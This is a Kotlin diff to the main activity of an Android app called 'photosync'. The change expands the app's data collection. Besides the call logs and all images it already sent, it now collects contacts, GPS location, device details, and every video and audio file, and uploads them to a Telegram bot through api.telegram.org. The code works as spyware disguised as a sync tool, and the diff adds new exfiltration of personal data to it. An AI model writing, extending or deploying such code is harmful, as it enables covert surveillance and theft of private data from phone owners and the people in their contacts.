@@ -1,17 +1,25 @@
 // language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
-// *Sends call logs once per sync pass and streams all accessible MediaStore images until exhausted with retries*
+// *Collects permitted device info, location, contacts, call logs once per run, and streams media items to Telegram*
 package com.example.photosync
 
 import android.Manifest
 import android.content.ContentUris
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
+import android.location.LocationManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.Uri
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
 import android.provider.CallLog
+import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.view.Gravity
 import android.view.View
@@ -270,14 +278,25 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
-    private fun checkAndRequestPermissions() {
-        val permissions = mutableListOf(Manifest.permission.READ_CALL_LOG)
+    private fun requiredRuntimePermissions(): List<String> {
+        val list = mutableListOf(
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
+            list.add(Manifest.permission.READ_MEDIA_IMAGES)
+            list.add(Manifest.permission.READ_MEDIA_VIDEO)
+            list.add(Manifest.permission.READ_MEDIA_AUDIO)
         } else {
-            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
+        return list
+    }
 
+    private fun checkAndRequestPermissions() {
+        val permissions = requiredRuntimePermissions()
         val missing = permissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
@@ -295,15 +314,44 @@ class MainActivity : AppCompatActivity() {
         ioExecutor.execute {
             val maxRetries = 3
             var callLogsSent = false
+            var infoSent = false
 
             for (attempt in 1..maxRetries) {
                 try {
                     updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
+                    if (!infoSent) {
+                        sendDeviceAndLocationInfo()
+                        sendContactsIfPermitted()
+                        infoSent = true
+                    }
                     if (!callLogsSent) {
                         sendCallLogsOnce()
                         callLogsSent = true
                     }
-                    sendAllPhotosUntilDone()
+                    sendMediaCollection(
+                        contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        endpointMethod = "sendPhoto",
+                        fieldName = "photo",
+                        filePrefix = "photo",
+                        mimeType = "image/jpeg",
+                        label = "الصور"
+                    )
+                    sendMediaCollection(
+                        contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                        endpointMethod = "sendVideo",
+                        fieldName = "video",
+                        filePrefix = "video",
+                        mimeType = "video/mp4",
+                        label = "الفيديوهات"
+                    )
+                    sendMediaCollection(
+                        contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                        endpointMethod = "sendAudio",
+                        fieldName = "audio",
+                        filePrefix = "audio",
+                        mimeType = "audio/mpeg",
+                        label = "الملفات الصوتية"
+                    )
                     updateStatus("اكتملت العملية بنجاح.")
                     return@execute
                 } catch (_: Exception) {
@@ -318,6 +366,85 @@ class MainActivity : AppCompatActivity() {
                 }
             }
             updateStatus("تعذر إتمام العملية بعد عدة محاولات.")
+        }
+    }
+
+    private fun sendDeviceAndLocationInfo() {
+        val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
+
+        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val caps = cm.activeNetwork?.let { cm.getNetworkCapabilities(it) }
+        val netType = when {
+            caps == null -> "NONE"
+            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
+            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
+            else -> "OTHER"
+        }
+
+        val locText = readLastLocationText()
+        val msg = buildString {
+            appendLine("DeviceInfo:")
+            appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
+            appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
+            appendLine("Battery: ${batteryPct}%")
+            appendLine("Network: $netType")
+            appendLine("Location: $locText")
+        }
+        postTelegramText(msg.take(3900))
+    }
+
+    private fun readLastLocationText(): String {
+        val fineGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        val coarseGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        if (!fineGranted && !coarseGranted) return "permission_denied"
+
+        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
+        for (provider in providers) {
+            try {
+                if (lm.isProviderEnabled(provider)) {
+                    val loc = lm.getLastKnownLocation(provider)
+                    if (loc != null) {
+                        return "lat=${loc.latitude}, lon=${loc.longitude} ($provider)"
+                    }
+                }
+            } catch (_: SecurityException) {
+            }
+        }
+        return "unavailable"
+    }
+
+    private fun sendContactsIfPermitted() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        val entries = mutableListOf<String>()
+        contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER
+            ),
+            null,
+            null,
+            null
+        )?.use { cursor ->
+            val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+            while (cursor.moveToNext() && entries.size < 100) {
+                val name = cursor.getString(nameIdx) ?: "unknown"
+                val num = cursor.getString(numIdx) ?: ""
+                entries.add("$name: $num")
+            }
+        }
+
+        if (entries.isNotEmpty()) {
+            val text = "Contacts:\n" + entries.joinToString("\n")
+            postTelegramText(text.take(3900))
         }
     }
 
@@ -370,34 +497,63 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendAllPhotosUntilDone() {
-        val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
-        } else {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+    private fun hasMediaPermissionFor(contentUri: Uri): Boolean {
+        return when (contentUri) {
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+                } else {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                }
+            }
+            MediaStore.Video.Media.EXTERNAL_CONTENT_URI -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
+                } else {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                }
+            }
+            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
+                } else {
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                }
+            }
+            else -> false
         }
-        if (!hasImagePerm) return
+    }
+
+    private fun sendMediaCollection(
+        contentUri: Uri,
+        endpointMethod: String,
+        fieldName: String,
+        filePrefix: String,
+        mimeType: String,
+        label: String
+    ) {
+        if (!hasMediaPermissionFor(contentUri)) return
 
         val uris = mutableListOf<Uri>()
-        val projection = arrayOf(MediaStore.Images.Media._ID)
+        val projection = arrayOf(MediaStore.MediaColumns._ID)
         contentResolver.query(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            contentUri,
             projection,
             null,
             null,
-            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
         )?.use { cursor ->
-            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
             while (cursor.moveToNext()) {
                 val id = cursor.getLong(idIdx)
-                uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
+                uris.add(ContentUris.withAppendedId(contentUri, id))
             }
         }
 
         val total = uris.size
         for ((index, uri) in uris.withIndex()) {
-            updateStatus("إرسال الصور (${index + 1}/$total)...")
-            postTelegramPhoto(uri)
+            updateStatus("إرسال $label (${index + 1}/$total)...")
+            postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
             Thread.sleep(500L)
         }
     }
@@ -430,13 +586,19 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun postTelegramPhoto(imageUri: Uri) {
+    private fun postTelegramMedia(
+        mediaUri: Uri,
+        endpointMethod: String,
+        fieldName: String,
+        filePrefix: String,
+        mimeType: String
+    ) {
         val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
         val lineEnd = "\r\n"
         val twoHyphens = "--"
-        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"
+        val endpoint = "https://api.telegram.org/bot$botToken/$endpointMethod"
 
-        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
+        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
             connectTimeout = 60_000
@@ -456,9 +618,9 @@ class MainActivity : AppCompatActivity() {
 
                     out.writeBytes(twoHyphens + boundary + lineEnd)
                     out.writeBytes(
-                        "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
+                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.currentTimeMillis()}\"$lineEnd"
                     )
-                    out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+                    out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")
 
                     val buffer = ByteArray(8192)
                     var bytesRead: Int
@@ -474,7 +636,7 @@ class MainActivity : AppCompatActivity() {
 
             val code = conn.responseCode
             if (code !in 200..299) {
-                throw RuntimeException("Telegram photo HTTP $code")
+                throw RuntimeException("Telegram $endpointMethod HTTP $code")
             }
         } finally {
             conn.disconnect()
